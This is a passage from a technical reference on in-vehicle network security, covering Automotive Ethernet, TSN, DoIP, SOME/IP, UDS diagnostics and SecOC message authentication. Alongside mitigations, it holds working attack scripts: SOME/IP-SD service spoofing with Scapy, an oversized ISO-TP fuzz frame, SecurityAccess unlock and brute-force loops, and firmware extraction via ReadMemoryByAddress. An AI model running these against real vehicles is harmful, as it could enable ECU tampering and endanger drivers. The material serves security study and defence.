**100BASE-T1 (IEEE 802.3bw)**: single unshielded twisted pair, 100 Mbps, PAM-3 encoding, designed for the automotive environment (EMC, temperature range, weight). PAM-3 encoding transmits one of three amplitude levels (+1, 0, -1) per symbol, achieving 100 Mbps over a single pair by using 66.67 Msymbols/s (each symbol carries 1.58 bits). The single-pair design halves the cable weight and connector complexity compared to standard Ethernet (two or four pairs), a significant factor in automotive wiring harness design where total copper weight can exceed 50 kg.

**1000BASE-T1 (IEEE 802.3bp)**: 1 Gbps over single twisted pair, using PAM-3 at 750 Msymbols/s with full-duplex echo cancellation. Both use the BroadR-Reach PHY specification (now standardized as IEEE 802.3).

The key advantage over CAN: Ethernet provides the bandwidth for: camera feeds (surround-view, ADAS), LiDAR point clouds, high-definition map data, OTA updates, and infotainment streaming — none of which fit in CAN's 8-byte (or CAN FD's 64-byte) frames.

From a physical-layer security perspective, Automotive Ethernet uses point-to-point links (each ECU connects to a switch, not a shared bus), which means an attacker cannot passively sniff traffic between other nodes without compromising a switch or inserting a network tap. This is a fundamental improvement over CAN's shared-bus architecture where every node sees every frame. However, once an attacker compromises a single ECU on the Ethernet network, they gain switch-level access and can potentially reach any other ECU via the switch fabric, depending on VLAN and filtering configuration.

### 6.2 Switch architecture and VLAN segmentation

Automotive Ethernet switches (Marvell 88Q5072, NXP SJA1110, Broadcom BCM8956x) form the backbone of the in-vehicle Ethernet network. Unlike CAN's flat shared bus, Ethernet provides hardware-enforced isolation through VLANs (IEEE 802.1Q) and port-based access control.

A typical architecture assigns each functional domain to a VLAN: VLAN 10 for ADAS (camera feeds, sensor fusion), VLAN 20 for infotainment (streaming, connectivity), VLAN 30 for diagnostics (DoIP traffic), and VLAN 40 for chassis control. The central switch (or switches) enforce that traffic from one VLAN cannot reach another without passing through an explicitly configured inter-VLAN routing policy — typically enforced at the central gateway/domain controller.

Port-based VLAN assignment means each physical switch port is assigned to exactly one VLAN. An ECU connected to a port in VLAN 10 can only communicate with other VLAN 10 ports. This is the Ethernet equivalent of CAN's bus segmentation, but with hardware enforcement at the switch ASIC level rather than gateway software filtering.

**Security considerations.** VLAN hopping — an attacker on the infotainment VLAN attempting to reach the ADAS VLAN — is prevented if the switch is correctly configured (no trunk ports exposed to untrusted ECUs, no native VLAN misconfigurations). However, a compromised ECU that shares a switch with a domain controller may be able to exploit switch management interfaces (if the switch exposes SNMP, SSH, or a proprietary management protocol on the data plane). Automotive switch ASICs typically do not expose management interfaces on data ports — management is done via a dedicated out-of-band interface connected only to the OEM's manufacturing and diagnostic toolchain.

MACsec (IEEE 802.1AE) provides link-layer encryption and authentication on each Ethernet segment. When deployed, MACsec encrypts the frame payload and authenticates the entire frame (including the Ethernet header) using AES-GCM-128 or AES-GCM-256 with per-link session keys. A MACsec-protected link prevents an attacker with physical access to the cable from sniffing or injecting frames. MACsec key agreement (MKA, IEEE 802.1X-2010) distributes session keys using pre-shared keys or EAP-based authentication. Automotive deployment typically uses pre-shared keys provisioned at manufacturing, stored in the ECU's HSM.

### 6.3 Time-Sensitive Networking (TSN)

TSN is not a single standard but a profile of IEEE 802.1 standards tailored for automotive use. The AVNU Alliance defines the automotive TSN profile, selecting and constraining the applicable 802.1 standards for interoperability.

IEEE 802.1 TSN provides deterministic, real-time communication over Ethernet — necessary for safety-critical automotive applications (replacing the determinism that CAN provides via its priority-based arbitration).

**IEEE 802.1AS (gPTP — generalized Precision Time Protocol).** Synchronizes all TSN nodes to a common time reference with sub-microsecond accuracy. The grandmaster clock distributes its time via Sync and Follow-Up messages. Each bridge (switch) measures and compensates for propagation delay and residence time. From a security perspective, gPTP is vulnerable to time-synchronization attacks: an attacker injecting forged Sync messages can desynchronize the network, causing time-aware shapers to open their gates at the wrong time — effectively disrupting all safety-critical traffic scheduling. IEEE 802.1AS-2020 adds support for redundant grandmasters and cryptographic authentication of gPTP messages via an annex specifying HMAC-based integrity protection.

**IEEE 802.1Qbv (Time-Aware Shaper).** Divides time into a repeating schedule of gate-open and gate-closed windows for each traffic class. Safety-critical traffic is assigned an exclusive time window during which only that traffic class's gate is open, guaranteeing bounded latency. The schedule is configured at network design time and distributed to all switches. An attacker who can modify the gate schedule (by compromising the network management plane) can deny service to safety-critical traffic or create time windows where attacker traffic has exclusive access.

**IEEE 802.1CB (Frame Replication and Elimination for Reliability — FRER).** Provides redundancy by replicating frames across multiple disjoint paths and eliminating duplicates at the receiver. This protects against single-link failures and, when combined with MACsec, against an attacker who can disrupt one (but not all) paths.

**IEEE 802.1Qci (Per-Stream Filtering and Policing — PSFP).** Performs ingress filtering per stream: checking that frames arrive within the expected time window, at the expected rate, and with the expected size. PSFP is the TSN equivalent of a CAN gateway's ID whitelist — it enforces that each stream conforms to its specification and drops non-conforming frames. This is the primary TSN mechanism for network segmentation and attack containment.

### 6.4 DoIP (Diagnostics over IP)

ISO 13400 defines the encapsulation of UDS messages in TCP/IP. The DoIP header is 8 bytes: Protocol Version (1 byte, 0x02 for ISO 13400-2:2019), Inverse Protocol Version (1 byte, bitwise NOT of protocol version — 0xFD — for header validation), Payload Type (2 bytes, big-endian), and Payload Length (4 bytes, big-endian). Key payload types: 0x0001 (Vehicle Identification Request — sent via UDP broadcast), 0x0004 (Vehicle Identification Response — contains VIN, logical address, GID, EID), 0x0005 (Routing Activation Request — initiates a diagnostic session over TCP), 0x0006 (Routing Activation Response — confirms diagnostic access), 0x8001 (Diagnostic Message — wraps a UDS PDU), 0x8003 (Diagnostic Message Positive Acknowledgement).

The diagnostic workflow: the tester sends a Vehicle Identification Request (UDP broadcast on port 13400); DoIP entities respond with their VIN, logical address, and IP address. The tester then opens a TCP connection to port 13400 on the target DoIP entity and sends a Routing Activation Request. Upon receiving a Routing Activation Response with activation code 0x10 (routing activated), the tester can send Diagnostic Messages containing UDS PDUs.

DoIP inherits all IP-based attack vectors: ARP spoofing to MitM the diagnostic connection, unauthorized DoIP connections from any device on the Automotive Ethernet (if not authenticated), and remote DoIP access if the vehicle's telematics unit bridges IP from the cellular network to the Automotive Ethernet (which it should not, but misconfigurations occur).

**DoIP attack workflow using `doipclient` (Python).** The `python-doipclient` library implements the DoIP protocol for diagnostic tool development — and exploitation:

```python
from doipclient import DoIPClient
from doipclient.messages import *

# Discover DoIP entities on the network
client = DoIPClient('192.168.1.1', 13400)
# Vehicle identification request — returns VIN, logical address
client.request_vehicle_identification()

# Connect to the DoIP gateway and send a UDS DiagnosticSessionControl
# to enter extended diagnostic session
client.send_diagnostic(
    logical_address=0x0001,
    data=bytes([0x10, 0x03])  # DiagnosticSessionControl, extendedDiagnosticSession
)
response = client.receive_diagnostic()
print(f"Response: {response.hex()}")

# SecurityAccess seed request
client.send_diagnostic(
    logical_address=0x0001,
    data=bytes([0x27, 0x01])  # SecurityAccess, requestSeed
)
seed_response = client.receive_diagnostic()
seed = seed_response[2:]  # Extract seed bytes (skip service ID + subfunction)
```

An attacker on the vehicle's Ethernet network can use this workflow to access any ECU reachable via the DoIP gateway, enumerate security access levels, and attempt key derivation. The lack of mutual authentication in basic DoIP means any device on the network can impersonate a diagnostic tester.

**DoIP security mitigations.** ISO 13400-3 specifies TLS for DoIP (DoIP over TLS on port 3496), requiring the diagnostic tester to authenticate with a certificate. However, deployment is inconsistent: many 2020-2025 vehicles still use unauthenticated DoIP on port 13400, particularly for internal Ethernet diagnostic access.

### 6.5 SOME/IP

SOME/IP (Scalable service-Oriented MiddlewarE over IP) is the dominant middleware for service-oriented communication in AUTOSAR Adaptive Platform.

**Header format.** Message ID (32 bits: Service ID [16 bits] + Method ID [16 bits]), Length (32 bits), Request ID (32 bits: Client ID [16 bits] + Session ID [16 bits]), Protocol Version (8 bits), Interface Version (8 bits), Message Type (8 bits: REQUEST=0x00, REQUEST_NO_RETURN=0x01, NOTIFICATION=0x02, RESPONSE=0x80, ERROR=0x81), Return Code (8 bits: E_OK=0x00, E_NOT_OK=0x01, etc.).

**Serialization format.** SOME/IP serializes method parameters into the payload following the header. The serialization is defined per interface in FIDL (Franca Interface Definition Language) or ARXML files: it specifies the byte order, alignment, and padding for each parameter. An attacker must know or reverse-engineer the interface definition to craft valid method calls. However, the serialization is type-length-value based and not encrypted — a network capture (Wireshark with the SOME/IP dissector) reveals the structure.

**Communication patterns.** Request-response (client sends REQUEST, server responds with RESPONSE). Fire-and-forget (REQUEST_NO_RETURN, no response expected). Event notification (server sends NOTIFICATION to subscribed clients). Field access (getter/setter for data fields).

**SOME/IP-SD (Service Discovery).** Uses UDP multicast (default 224.224.224.245:30490). SD messages contain: service entries (offering or finding a service) and endpoint options (IP address and port where the service is available). An attacker on the network can: discover all services via passive SD monitoring, call any method on any discovered service (if no authentication is configured), and inject SD messages to advertise fake services (redirecting clients to the attacker's endpoint — a service-spoofing attack).

**SOME/IP-SD attack — service impersonation.** The attacker monitors the multicast group for OfferService entries, identifies a target service (e.g., the vehicle-speed service offered by the chassis ECU), then races to send a StopOfferService entry for the legitimate service followed by a new OfferService entry pointing to the attacker's IP. Clients that re-subscribe will connect to the attacker's fake service, which can return manipulated data. This is the automotive equivalent of ARP spoofing or DNS hijacking, but at the service-discovery layer.

**vsomeip testing.** The `vsomeip` library (GENIVI/COVESA) is the reference open-source SOME/IP implementation. Configuration for a test client:

```json
{
    "unicast": "192.168.1.100",
    "logging": { "level": "debug", "console": "true" },
    "applications": [
        { "name": "test_client", "id": "0x1234" }
    ],
    "services": [
        {
            "service": "0x1000",
            "instance": "0x0001",
            "unicast": "192.168.1.200",
            "unreliable": "30509"
        }
    ],
    "routing": "test_client",
    "service-discovery": {
        "enable": "true",
        "multicast": "224.224.224.245",
        "port": "30490",
        "protocol": "udp"
    }
}
```

Running vsomeip with the `VSOMEIP_CONFIGURATION` environment variable pointing to this JSON allows the tester to discover and interact with vehicle services from a Linux laptop connected to the Automotive Ethernet.

**SOME/IP-SD spoofing with Scapy.** Scapy's `automotive` contribution layer includes SOME/IP and SOME/IP-SD dissectors and packet constructors. The following demonstrates a service impersonation attack — advertising a fake service to redirect clients:

```python
from scapy.all import *
from scapy.contrib.automotive.someip import *

# Craft a SOME/IP-SD OfferService entry
# Service ID 0x1000, Instance 0x0001, Major Version 1, TTL 3 (seconds)
sd_entry = SDEntry_Service(
    type=0x01,               # OfferService
    srv_id=0x1000,
    inst_id=0x0001,
    major_ver=1,
    ttl=3,
    minor_ver=0
)

# Endpoint option: attacker's IP and UDP port
sd_option = SDOption_IP4_Endpoint(
    addr="192.168.1.100",    # Attacker's IP
    l4_proto=0x11,           # UDP
    port=30509               # Attacker's service port
)

# Wrap in SOME/IP-SD header
sd_pkt = SD(
    flags=0xC0,              # Reboot + Unicast flags
    entries_array=[sd_entry],
    options_array=[sd_option]
)

# Wrap in SOME/IP header (Service ID 0xFFFF, Method ID 0x8100 = SD)
someip_pkt = SOMEIP(
    srv_id=0xFFFF,
    method_id=0x8100,
    client_id=0x0000,
    session_id=0x0001,
    proto_ver=1,
    iface_ver=1,
    msg_type=0x02,           # NOTIFICATION
    retcode=0x00
) / sd_pkt

# Send via UDP multicast to SOME/IP-SD group
pkt = IP(dst="224.224.224.245") / UDP(sport=30490, dport=30490) / someip_pkt
send(pkt, iface="eth0", count=10, inter=0.5)
```

This sends 10 OfferService notifications to the SOME/IP-SD multicast group, claiming that service 0x1000 is available at the attacker's IP on UDP port 30509. Any client that subscribes to this service after seeing the offer will send its requests to the attacker instead of the legitimate ECU.

**Network sniffing.** Wireshark includes dissectors for SOME/IP, SOME/IP-SD, DoIP, and other automotive protocols. The TECMP (Trace Equipment Control and Multimedia Protocol) format, used by automotive network capture hardware (Vector VN5xxx, Technica Engineering capture modules), adds metadata (hardware timestamps, channel identifiers) to Ethernet captures. Wireshark's TECMP dissector decodes this metadata for precise timing analysis.

SOME/IP has no built-in security. AUTOSAR specifies **TLS for SOME/IP** (wrapping SOME/IP in TLS for TCP-based communication) and **DTLS for SOME/IP** (for UDP-based communication) as optional security extensions.

### 6.6 AUTOSAR Adaptive Platform

The AUTOSAR Adaptive Platform provides a POSIX-based runtime environment for high-performance ECUs (running Linux, QNX, or a similar OS). Unlike the Classic Platform (which targets resource-constrained MCUs running bare-metal or OSEK), the Adaptive Platform targets domain controllers and central compute units that require dynamic service deployment, high-bandwidth communication, and OS-level process isolation.

Key components for security:

**Identity and Access Management (IAM).** The IAM module enforces access policies for SOME/IP service consumers. Each Adaptive Application has an application manifest (ARXML) that declares which services it is permitted to offer and consume. The IAM module validates these declarations at runtime: a compromised application that attempts to call a service not listed in its manifest is blocked. This is the automotive equivalent of SELinux mandatory access control, but at the service-communication layer rather than the syscall layer.

**Crypto API and Crypto Service Manager (CSM).** The Crypto API provides a hardware-abstracted interface to cryptographic operations: key generation, symmetric encryption (AES-GCM, AES-CBC), asymmetric operations (ECDSA, RSA), hashing (SHA-256, SHA-384), MAC (CMAC, HMAC), and random number generation. The CSM dispatches these operations to the appropriate crypto driver — typically an HSM driver for hardware-accelerated operations or a software crypto library for ECUs without HSMs. The Crypto API enforces key access policies: keys are referenced by handles, and only applications with the appropriate IAM permissions can use a given key.

**Secure Communication.** TLS 1.2/1.3 for TCP-based SOME/IP and DTLS 1.2 for UDP-based SOME/IP. The Adaptive Platform's communication management module handles TLS session establishment, certificate validation (using a local trust store provisioned at manufacturing), and session key management. Mutual authentication (both client and server present certificates) is supported but requires PKI infrastructure — each ECU needs a unique device certificate signed by the OEM's CA chain.

**Update and Configuration Management (UCM).** UCM handles software package installation, update, and rollback on Adaptive Platform ECUs. Security features: packages must be signed (RSA-PSS or ECDSA over SHA-256), the UCM verifies the signature before installation, version downgrade is prevented by a monotonic version counter stored in the HSM's secure counter. UCM is the Adaptive Platform's defense against unauthorized firmware modification — but it only protects the Adaptive Platform ECUs, not Classic Platform ECUs (which rely on UDS-based update mechanisms with varying levels of signature verification).

---

## 7. UDS (Unified Diagnostic Services — ISO 14229)

### 7.1 Service overview

UDS defines a comprehensive set of diagnostic services organized by functional category. Each service is identified by a Service Identifier (SID) byte. The following table lists the security-relevant services:

| SID | Service Name | Security Relevance |
|-----|-------------|-------------------|
| 0x10 | DiagnosticSessionControl | Switches ECU to extended/programming session (enables privileged services) |
| 0x11 | ECUReset | Resets ECU (hard/soft/keyOffOnReset) — DoS vector |
| 0x14 | ClearDiagnosticInformation | Clears DTCs — evidence destruction |
| 0x22 | ReadDataByIdentifier | Reads ECU data (VIN, calibration, keys) — information disclosure |
| 0x23 | ReadMemoryByAddress | Reads arbitrary ECU memory — firmware extraction |
| 0x27 | SecurityAccess | Seed-key authentication — the sole authentication gate |
| 0x28 | CommunicationControl | Enables/disables ECU communication — targeted DoS |
| 0x29 | Authentication | PKI-based authentication (ISO 14229-1:2020 addition) |
| 0x2E | WriteDataByIdentifier | Writes ECU parameters (VIN, feature flags) — parameter tampering |
| 0x2F | InputOutputControlByIdentifier | Controls ECU actuators (valves, motors) — physical manipulation |
| 0x31 | RoutineControl | Executes ECU routines (self-tests, calibrations) — arbitrary execution |
| 0x34 | RequestDownload | Initiates firmware download to ECU — firmware replacement |
| 0x35 | RequestUpload | Initiates firmware upload from ECU — firmware extraction |
| 0x36 | TransferData | Transfers firmware blocks (used with 0x34/0x35) |
| 0x37 | RequestTransferExit | Completes firmware transfer |
| 0x3D | WriteMemoryByAddress | Writes arbitrary ECU memory — arbitrary code execution |
| 0x3E | TesterPresent | Keeps diagnostic session alive (no direct security impact) |
| 0x85 | ControlDTCSetting | Disables DTC recording — suppresses evidence of attack |

### 7.2 ISO-TP (ISO 15765-2) transport layer

CAN's 8-byte payload cannot carry most UDS messages directly. ISO-TP provides segmentation and reassembly for multi-frame UDS messages. Four frame types:

**Single Frame (SF).** For messages ≤ 7 bytes (standard CAN) or ≤ 63 bytes (CAN FD). Byte 0: `0x0N` where N = data length. Bytes 1–7: UDS data.

**First Frame (FF).** Initiates a multi-frame transfer. Bytes 0–1: `0x1NNN` where NNN = total data length (12 bits, max 4095 bytes). Bytes 2–7: first 6 bytes of UDS data.

**Consecutive Frame (CF).** Continues the transfer. Byte 0: `0x2N` where N = sequence number (0x0–0xF, wrapping). Bytes 1–7: next 7 bytes of UDS data.

**Flow Control (FC).** Sent by the receiver after the FF. Byte 0: `0x3S` where S = flow status (0=Continue To Send, 1=Wait, 2=Overflow/Abort). Byte 1: Block Size (BS) — number of CFs the sender may transmit before waiting for the next FC (0 = no limit). Byte 2: Separation Time (STmin) — minimum time between consecutive CFs in milliseconds (0x00–0x7F = 0–127 ms, 0xF1–0xF9 = 100–900 μs).

Example: reading the VIN (Data Identifier 0xF190) via ReadDataByIdentifier (0x22):

```bash
# Using isotpsend/isotprecv (from can-utils)
# Send ReadDataByIdentifier request for VIN
echo "22 F1 90" | isotpsend -s 0x7DF -d 0x7E8 can0
# Receive response (positive response: 0x62 F1 90 + VIN bytes)
isotprecv -s 0x7E8 -d 0x7DF can0
```

A multi-frame transfer example: downloading 100 bytes of firmware data via TransferData (0x36). The request payload is 102 bytes (SID 0x36 + blockSequenceCounter 0x01 + 100 bytes of data). This exceeds the 7-byte single-frame limit, so ISO-TP segments it:

```
FF:  [10 66] [36 01 AA BB CC DD]  → First Frame: length=0x066 (102), first 6 data bytes
FC:  [30 00 0A]                   → Flow Control: ContinueTo Send, BS=0 (no limit), STmin=10ms
CF1: [21 EE FF 00 11 22 33 44]   → Consecutive Frame: SN=1, next 7 bytes
CF2: [22 55 66 77 88 99 AA BB]   → SN=2
...
CF14:[2E xx xx xx xx xx 00 00]   → SN=14 (0xE), last bytes + padding
```

The receiver reassembles the 14 consecutive frames into the complete 102-byte UDS request and processes it as a single TransferData service call.

The ISO-TP layer introduces its own attack surface: a malformed First Frame with an excessively large length value (e.g., 0xFFF = 4095 bytes when the receiving ECU's ISO-TP buffer is only 256 bytes) can trigger buffer overflow in poorly-implemented ISO-TP stacks. This class of vulnerability has been demonstrated in automotive ECUs where the ISO-TP implementation allocates a stack-based buffer sized by the FF length field without bounds checking. Sending Flow Control frames with FS=Wait (0x01) indefinitely stalls a transmitting ECU — a targeted DoS that does not require bus flooding. Injecting Consecutive Frames with out-of-sequence numbers corrupts the reassembled message, potentially causing the ECU to process garbled data.

**ISO-TP fuzzing with Scapy:**

```python
from scapy.contrib.isotp import ISOTPSocket, ISOTP
from scapy.contrib.automotive.uds import UDS

# Open ISO-TP socket to the target ECU
sock = ISOTPSocket('can0', tx_id=0x7E0, rx_id=0x7E8)

# Send a valid DiagnosticSessionControl to verify connectivity
resp = sock.sr1(UDS() / UDS_DSC(diagnosticSessionType=0x03), timeout=2)

# Fuzz: send oversized ISO-TP frame to test buffer handling
payload = b'\x36\x01' + b'\x41' * 4093  # 4095-byte TransferData request
sock.send(ISOTP(data=payload))
```

### 7.3 SecurityAccess exploitation

**Diagnostic attacks via UDS.** With access to the diagnostic CAN bus (via OBD-II or a compromised gateway), the attacker uses UDS services:

1. `DiagnosticSessionControl (0x10)` — switch to Extended Diagnostic Session (0x03) or Programming Session (0x02).
2. `SecurityAccess (0x27)` — request a seed (subfunction 0x01/0x03/...), compute the key, and send it (subfunction 0x02/0x04/...). If the key is correct, the ECU unlocks.
3. With the ECU unlocked: `WriteDataByIdentifier (0x2E)` to modify ECU parameters (VIN, calibration data, feature flags), `RoutineControl (0x31)` to execute ECU routines (self-tests, actuator activations, parameter resets), or `RequestDownload (0x34)` → `TransferData (0x36)` → `RequestTransferExit (0x37)` to flash new firmware.

**SecurityAccess algorithm reversing.** The seed-key algorithm is the sole authentication barrier. Reversing it requires: extracting the ECU firmware (via JTAG, flash dump, or OTA-update-package decryption), disassembling the firmware (ARM/TriCore/PowerPC, depending on the ECU's MCU), locating the SecurityAccess handler (search for the UDS service dispatch table, find the 0x27 handler), and reversing the key-derivation function.

Common weaknesses: XOR with a fixed mask, CRC-based derivation, short key space (16-bit key — 65536 possibilities, brute-forceable in seconds), reused seeds (the same seed is returned every time, making the key static), and no attempt-counter (unlimited brute-force attempts without lockout).

A complete SecurityAccess workflow using `udsoncan`:

```python
import udsoncan
from udsoncan.connections import IsoTPSocketConnection
from udsoncan.client import Client
from udsoncan.services import SecurityAccess
import udsoncan.configs

config = udsoncan.configs.default_client_config.copy()
conn = IsoTPSocketConnection('can0', rxid=0x7E8, txid=0x7E0)

with Client(conn, config=config) as client:
    # Enter extended diagnostic session
    client.change_session(udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession)

    # Request seed (security level 0x01)
    response = client.unlock_security_access(0x01)
    # response.service_data.seed contains the seed bytes

    # If the seed-key algorithm is known (e.g., XOR with 0xDEAD):
    seed = response.service_data.seed
    key = bytes([b ^ 0xDE for b in seed[:2]] + [b ^ 0xAD for b in seed[2:4]])
    client.unlock_security_access(0x02, key)

    # ECU is now unlocked — read memory at address 0x00080000, 256 bytes
    response = client.read_memory_by_address(
        udsoncan.MemoryLocation(address=0x00080000, memorysize=256, address_format=32, memorysize_format=16)
    )
    firmware_bytes = response.service_data.memory_block
```

**Brute-force approach** when the algorithm is unknown but the key space is small:

```python
import udsoncan
from udsoncan.connections import IsoTPSocketConnection
from udsoncan.client import Client
import time

conn = IsoTPSocketConnection('can0', rxid=0x7E8, txid=0x7E0)

with Client(conn) as client:
    client.change_session(3)  # Extended session

    for candidate in range(0x10000):  # 16-bit key space
        try:
            resp = client.unlock_security_access(0x01)  # Get fresh seed
            key = candidate.to_bytes(2, 'big')
            client.unlock_security_access(0x02, key)
            print(f"[+] Key found: 0x{candidate:04X}")
            break
        except udsoncan.NegativeResponseException as e:
            if e.response.code == 0x36:  # exceededNumberOfAttempts
                print("[-] Locked out, waiting...")
                time.sleep(10)  # Wait for lockout to expire
            elif e.response.code == 0x37:  # requiredTimeDelayNotExpired
                time.sleep(1)
            # 0x35 (invalidKey) — continue to next candidate
```

### 7.4 Negative Response Codes (NRC)

When a UDS service request fails, the ECU returns a Negative Response with a Negative Response Code. Security-relevant NRCs:

| NRC | Name | Security Implication |
|-----|------|---------------------|
| 0x12 | subFunctionNotSupported | Enumeration: reveals which subfunctions exist |
| 0x13 | incorrectMessageLengthOrInvalidFormat | Input validation bypass: reveals expected format |
| 0x22 | conditionsNotCorrect | State machine info: reveals prerequisite conditions |
| 0x24 | requestSequenceError | Workflow info: reveals expected service sequence |
| 0x31 | requestOutOfRange | Parameter boundary info: reveals valid ranges |
| 0x33 | securityAccessDenied | Auth state: confirms ECU is locked |
| 0x35 | invalidKey | Auth: key was wrong (enables brute-force feedback) |
| 0x36 | exceededNumberOfAttempts | Rate limiting: attempt counter exists (good) |
| 0x37 | requiredTimeDelayNotExpired | Rate limiting: lockout timer active |
| 0x70 | uploadDownloadNotAccepted | Transfer state: ECU rejected firmware transfer |
| 0x72 | generalProgrammingFailure | Flash error: firmware write failed |
| 0x73 | wrongBlockSequenceCounter | Transfer state: block counter mismatch |

The NRC response pattern itself leaks information. An attacker can enumerate supported services by sending each SID and observing whether the response is `serviceNotSupported (0x11)` (service does not exist) or a different NRC (service exists but another condition is not met). Similarly, sending SecurityAccess with different security levels and observing whether the ECU returns `subFunctionNotSupported (0x12)` or a seed reveals which security levels are implemented.

### 7.5 ReadMemoryByAddress and WriteMemoryByAddress exploitation

`ReadMemoryByAddress (0x23)` allows reading arbitrary ECU memory if the security level permits. The request specifies an address and length; the response contains the raw memory contents. This enables firmware extraction from ECUs that lack JTAG access or flash-read protection:

```bash
# Read 256 bytes from address 0x00080000 via isotpsend
# addressAndLengthFormatIdentifier: 0x44 = 4-byte address, 4-byte length
echo "23 44 00 08 00 00 00 00 01 00" | isotpsend -s 0x7E0 -d 0x7E8 can0
```

`WriteMemoryByAddress (0x3D)` writes arbitrary memory contents. Combined with knowledge of the ECU's memory map (obtained via ReadMemoryByAddress or firmware RE), this enables patching firmware in-place: disabling immobilizer checks, modifying calibration tables, or injecting shellcode. The ECU must be in an unlocked security state and typically in programming session (0x02) for write access.

### 7.6 UDS Authentication service (0x29)

ISO 14229-1:2020 introduced the Authentication service (SID 0x29) as a modern replacement for the legacy SecurityAccess (0x27) seed-key mechanism. The Authentication service supports PKI-based mutual authentication using X.509 certificates and challenge-response protocols.

The workflow: the tester sends an Authentication request with subfunction 0x01 (deOrPersonalizedKey) or 0x02 (verifyCertificateUnidirectional) or 0x04 (verifyCertificateBidirectional). In the bidirectional case, both the tester and the ECU exchange certificates and prove possession of their private keys via digital signatures over a challenge. The ECU validates the tester's certificate against a trust store (OEM CA certificate chain stored in the ECU's secure storage). If validation succeeds, the ECU grants the requested access level.

The advantages over SecurityAccess are substantial: the key space is cryptographically strong (256-bit ECDSA keys vs. 16-bit XOR-derived keys), the protocol provides mutual authentication (the tester can verify the ECU's identity, preventing rogue-ECU attacks), certificate revocation (compromised tester certificates can be revoked via CRL or OCSP), and the private key never traverses the bus (only signatures are exchanged). The disadvantage is complexity: PKI infrastructure must be deployed across the entire vehicle fleet, certificates must be managed throughout the vehicle's 15-20 year lifecycle, and legacy ECUs (Classic Platform, low-cost MCUs without PKI libraries) cannot support it.

As of 2025, UDS Authentication (0x29) deployment is limited to premium OEMs' latest platforms. Most production vehicles still rely on SecurityAccess (0x27), and the transition is expected to take a full vehicle generation cycle (5-7 years).

`RequestDownload (0x34)` initiates a block transfer for larger firmware modifications. The attacker specifies the target memory address, the data format (compressed/encrypted — many ECUs accept uncompressed/unencrypted), and the transfer size. The ECU responds with the maximum block size. The attacker then sends the firmware in blocks via `TransferData (0x36)`, each block prefixed with a sequence counter. After the final block, `RequestTransferExit (0x37)` signals completion, and the ECU validates and installs the firmware (or, in many cases, simply writes it to flash without validation — the signature check, if any, occurs at boot time, not at download time).

---

## 8. SecOC (Secure On-Board Communication)

### 8.1 Position in the AUTOSAR COM stack

SecOC operates as a module within the AUTOSAR Classic Platform's communication stack, positioned between the PDU Router (PduR) and the lower transport layers (CAN Interface, CAN Transport Protocol, Ethernet Interface). When an application sends a message, the PDU Router passes it to SecOC, which appends the authentication data (truncated MAC and truncated freshness value) to create a Secured I-PDU. This Secured I-PDU is then passed to the transport layer for transmission. On the receiving side, SecOC intercepts the incoming Secured I-PDU, verifies the MAC and freshness, and passes the authenticated payload up to the application via PduR — or drops it silently if verification fails.

The key architectural point: SecOC is transparent to the application layer. Application software does not need modification to benefit from SecOC — the authentication is handled entirely within the communication stack. This design enables incremental deployment: SecOC can be added to specific PDUs without redesigning the entire application.

### 8.2 Mechanism

SecOC adds authentication to CAN/CAN FD/Ethernet PDUs. Each Authentic I-PDU contains: the original Payload Data, a Freshness Value (FV, used for anti-replay), and a truncated MAC (Message Authentication Code). The MAC is computed over: the Data ID (a static identifier for the PDU), the Payload, and the full Freshness Value — using a symmetric key (AES-128-CMAC or HMAC).

The MAC computation:

```
MAC = CMAC-AES-128(Key, DataID || Payload || FullFreshnessValue)
TruncatedMAC = MAC[0:TruncLength]
```

The Data ID is a 16-bit static identifier configured per PDU — it binds the MAC to the specific message context, preventing an attacker from taking a valid MAC from one PDU and applying it to a different PDU with the same payload.

### 8.3 Freshness management

The Freshness Value prevents replay attacks. Two models: **counter-based** (each message increments a counter; the sender and receiver synchronize counters) and **time-based** (using a synchronized clock). Only a truncated portion of the FV is transmitted in the PDU (to save CAN bandwidth); the receiver reconstructs the full FV from its internal counter/clock and the truncated value.

The full freshness value structure in AUTOSAR's reference implementation (Freshness Value Manager — FVM) typically consists of three components: a **trip counter** (incremented at each ignition cycle), a **reset counter** (incremented when the FVM explicitly resets — e.g., after key rotation), and a **message counter** (incremented per transmitted message). The concatenation of these three values forms the full freshness value. Only the least-significant bits of the message counter are transmitted in the PDU (the trip counter and reset counter are synchronized out-of-band via a dedicated synchronization message).

The Freshness Value Manager (FVM) handles synchronization. If the sender and receiver's counters desynchronize (e.g., after an ECU reset), a resynchronization protocol brings them back into alignment. The FVM periodically broadcasts a synchronization message containing the current trip counter and reset counter. ECUs that detect a gap between their local counter and the broadcast value update their local state.

**Replay window.** The receiver accepts messages whose freshness value falls within a configurable window around the expected value (e.g., expected counter ± 5). This window accommodates message loss and out-of-order delivery. A larger window increases robustness but also increases the replay window — an attacker who captures a frame can replay it as long as its freshness value falls within the acceptance window. Setting the window to 0 (strict sequential) rejects any message loss or reordering, which is impractical on CAN where frame loss occurs during bus contention.

### 8.4 MAC truncation

The full MAC (128 bits for AES-CMAC) is too large for CAN's 8-byte payload. SecOC truncates the MAC to a configurable length (typically 24–64 bits for CAN, longer for CAN FD/Ethernet). A shorter MAC reduces the forgery difficulty (a 24-bit MAC can be brute-forced in 2²⁴ ≈ 16 million attempts). The appropriate truncation length depends on the message's criticality and the acceptable latency for detection.

Quantitative analysis: on a CAN bus at 500 kbps, an attacker can send approximately 4000 frames per second. With a 24-bit MAC, brute-forcing a valid MAC requires 2²⁴ / 4000 ≈ 4194 seconds (70 minutes) on average. With a 28-bit MAC, this increases to ~18.6 hours. With a 32-bit MAC, ~12.4 days. For safety-critical messages (steering, braking), AUTOSAR recommends a minimum of 28 bits; for body-domain messages (door locks, HVAC), 24 bits may be acceptable given the lower impact of forgery.

On CAN FD (64-byte payload), the truncation pressure is relaxed: even with 32 bytes of signal data, there is room for an 8-byte (64-bit) MAC and a 4-byte freshness value, with 20 bytes remaining.

### 8.5 Key distribution

SecOC symmetric keys must be provisioned to every ECU that sends or receives authenticated messages. Key distribution is typically performed: at manufacturing (keys burned into the ECU's secure storage during production), or via a key management protocol (OEM-specific, often using UDS DiagnosticSessionControl + SecurityAccess to authenticate before key update). Key rotation (periodic key updates) is recommended but not universally implemented.

